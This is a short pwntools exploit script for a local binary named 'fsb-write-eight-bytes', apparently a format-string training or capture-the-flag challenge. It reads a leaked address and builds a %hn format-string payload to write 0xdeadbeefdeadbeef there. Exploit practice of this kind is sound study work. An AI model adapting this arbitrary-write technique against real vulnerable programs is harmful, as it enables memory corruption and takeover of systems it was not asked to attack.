#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
exe = "./fsb-write-eight-bytes"
elf = context.binary = ELF(exe)
io = process()
if args.GDB: gdb.attach(io, "b *main+113")

io.recvuntil(b"@ ")
secret = int(io.recvline(), 16)
info("secret @ %#x" % secret)

func_byte_array_hn  = lambda func_addr: [(func_addr >> (16 * i)) & 0xFFFF for i in range((func_addr.bit_length() + 7) // 16)]
diff_hn = lambda i, j: ((i - j) % 65536) # (0xFF+1)

start = 13
data = func_byte_array_hn(0xdeadbeefdeadbeef)

# # Writing 0xdeadbeefdeadbeef
payload = f"%{data[0]}c%{start}$hn"
for i in range(1, len(data)):
	payload += f"%{diff_hn(data[i], data[i-1])}c%{start+i}$hn"

# Padding
payload = payload.encode() + b"||||||"

# Writing the address:
for i in range(0, len(data)):
	payload += p64(secret+(i*2))

print(f"[*] Payload ({len(payload)=}) {payload}")

io.sendline(payload)
io.interactive()